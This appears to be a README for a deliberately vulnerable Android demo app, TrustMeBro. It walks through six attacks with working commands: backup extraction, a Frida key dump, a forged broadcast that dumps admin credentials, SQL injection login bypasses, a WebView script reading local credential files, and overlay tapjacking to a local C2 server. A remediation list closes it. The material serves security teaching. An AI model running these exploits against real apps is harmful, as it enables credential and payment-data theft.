# TrustMeBro - Vulnerability Testing Demo

## Prerequisites
1. Start C2 Server: `python3 exfil_overlay.py`
2. Bridge Network: `adb reverse tcp:8080 tcp:8080`
3. Grant Overlay: Open "Cleaner App" and grant "Display over other apps" permission.

## Backup configuration leak
**What it demonstrates**: Plaintext credentials exposed via device backup

### Demo Flow

```bash
# 1. In app: Tap "Step 1: Backup Configuration Leak"
# 3. Tap "Save" button to save credentials

# 4. Extract backup
adb backup -apk com.example.trustmebro -f backup.ab
# Tap "Back up my data" on emulator when prompted

# 5. Decompress
`python3 extract_ab.py backup.ab`

# 6. View plaintext credentials
ls -ltr apps/com.example.trustmebro/sp/
```
python3 
## Cryptographic Key Harvesting

**What it demonstrates**: Encryption keys in plaintext memory extractable via Frida

### Demo Flow

```bash
# 1. In app: Tap "Step 2: Cryptographic Key Harvesting"
# 2. Enter card: 4532 1234 5678 9010
# 3. Enter amount: 99.99
# 4. Tap "Tokenize" button
# View encrypted token in output

# 5. Start frida

# 6. Run Frida
frida -U -f com.example.trustmebro -l dump_keys.js

# 7. Tap "Decrypt" button - >  Keys exposed in plaintext memory
---
```

## System IPC Escalation (Unauthorized Data Export)

**What it demonstrates**: An exported Broadcast Receiver with no permission checks allows any malicious app to hijack internal logic and exfiltrate private data.

### 1. Normal (Legitimate) Usage
*   In app: Tap **"Step 3: System IPC Escalation"**
*   Tap **"Export User Database"**
*   **Result**: UI shows `INTERNAL BROADCAST RECEIVED`. This is the intended local app behavior.

### 2. The Exploit (Malicious Interception)
*   Keep the app open on Step 3.
*   Run the command below (simulating an attack from another app on the device):

```bash
# Attacker forces a dump of the ADMIN_CREDENTIALS table
adb shell am broadcast \
  -a com.example.trustmebro.EXPORT_DATA \
  -p com.example.trustmebro \
  --es format "JSON_DUMP" \
  --es table "ADMIN_CREDENTIALS" \
  --ez include_passwords true
```

### 3. Impact Assessment
*   **UI Update**: The app instantly switches to `EXTERNAL EXPLOIT SUCCESS`.
*   **Data Breach**: Detailed records (admin hashes, API tokens) appear on the screen and are dumped to system logs.
*   **Verification**: Check Logcat for the full exfiltrated dataset:
    `adb logcat | grep VULN_IPC`

---

## Database Leak & SQL Injection

**What it demonstrates**: String concatenation in SQL allows authentication bypass

### Demo Flow - Normal Login

```bash
# 1. In app: Tap "Step 4: Database Leak & SQL Injection"
# 2. Enter:
#    Username: admin
#    Password: admin123
# 3. Tap "Login"
```

### Demo Flow - SQL Injection Bypass #1

```bash
# 1. Username: admin' OR '1'='1
# 2. Password: anything
# 3. Tap "Login"
# Result: Logs in as admin (bypasses password check)
```

### Demo Flow - SQL Injection Bypass #2

```bash
# 1. Username: ' OR 1=1 --
# 2. Password: x
# 3. Tap "Login"
# Result: Logs in as first user (admin)
```

### Demo Flow - Extract Database

```bash
# Check logcat to see executed SQL
adb logcat | grep "TrustMeBro"

# Output shows:
# Query: SELECT * FROM admin_users WHERE username='admin' OR '1'='1' AND password='x'

# Extract database directly
adb pull /data/data/com.example.trustmebro/databases/admin_portal.db
sqlite3 admin_portal.db "SELECT * FROM admin_users;"

# Output:
# 1|admin|admin123|admin@company.com|super_admin|2024-05-20
# 2|john|john456|john@company.com|admin|2024-05-19
# 3|sarah|sarah789|sarah@company.com|moderator|2024-05-18
# 4|dev_user|dev_pass_2024|dev@company.com|developer|2024-05-15
```

---

## WebView Local File Hijacking

**What it demonstrates**: JavaScript can access local files and exfiltrate data

### Demo Flow - Normal Usage

```bash
# 1. In app: Tap "Step 5: WebView Local File Hijacking"
# 2. Click buttons:
#    - "Transfer Money" - prompts for amount
#    - "View Card Details" - shows card info
```

### Demo Flow - Extract JavaScript Variables

```bash
# 1. While app is open, run Chrome DevTools:
adb forward tcp:9222 localabstract:chrome_devtools_remote

# 2. Open Chrome: chrome://inspect
# 3. Click "inspect" on WebView
# 4. In Console tab, run:
window.accountToken
window.apiKey

# Output:
# "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl9pZCI6IjEyMzQ1Njc4OTAiLCJhY2NvdW50X251bWJlciI6IjU2NzgiLCJzc24iOiI1NTUtNjYtNzc3NyJ9..."
# "sk-live-51Iv1oHGiW8h9K0L1M2N3O4P5Q6R7S8T9U0V1W2X3Y4Z5A6"
```

### Demo Flow - Inject Malicious Code

```javascript
// In Chrome DevTools Console, paste this to read local files:
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        if (xhr.status == 200 || xhr.status == 0) {
            console.log("File accessible! Content:\n" + xhr.responseText);
        } else {
            console.log("File NOT accessible. Status: " + xhr.status);
        }
    }
};
xhr.open("GET", "file:///data/data/com.example.trustmebro/shared_prefs/auth.xml", true);
xhr.send();
```

### Demo Flow - Extract Credentials

```bash
# WebView can read local files because:
# - JavaScript enabled
# - allowFileAccess = true
# - allowFileAccessFromFileURLs = true
# - allowUniversalAccessFromFileURLs = true

# Verify file exists via ADB:
adb shell ls /data/data/com.example.trustmebro/shared_prefs/auth.xml
```

## Compositor Overlay Capture

**What it demonstrates**: Missing FLAG_SECURE allows screen capture and stealth Tapjacking

### Demo Flow - Stealth Tapjacking & Exfiltration
```bash
# 1. Ensure C2 Server is running and port is reversed
# 2. Open Cleaner App, tap "Start Optimization" (starts invisible overlay)
# 3. In TrustMeBro: Tap "Step 6: Compositor Overlay Capture"
# 4. Enter card details and tap "Pay"
# 5. Result: Check Attacker Terminal for: " COMPLETE PAYMENT DATA EXFILTRATED!"
```

### Demo Flow - Screenshot

```bash
# While on payment entry screen:
adb shell screencap -p /sdcard/screenshot.png
adb pull /sdcard/screenshot.png

# Open image - shows sensitive details (All visible because NO FLAG_SECURE)
```

### Demo Flow - Check Logcat for Vulnerability Signal

```bash
adb logcat | grep TrustMeBro

# Output confirms tapjacking detection failed to block:
# [VULNERABILITY] Tapjacking confirmed: Window is obscured by an external overlay.
```

## Remediation (Quick Reference)

1. Set `android:allowBackup="false"` or use very specific dataExtractionRules
2. Use Android Keystore for key storage
3. Add signature verification to receivers
4. Use parameterized SQL queries
5. Disable JavaScript in WebView, use ContentSecurityPolicy
6. Add `FLAG_SECURE` to sensitive activities
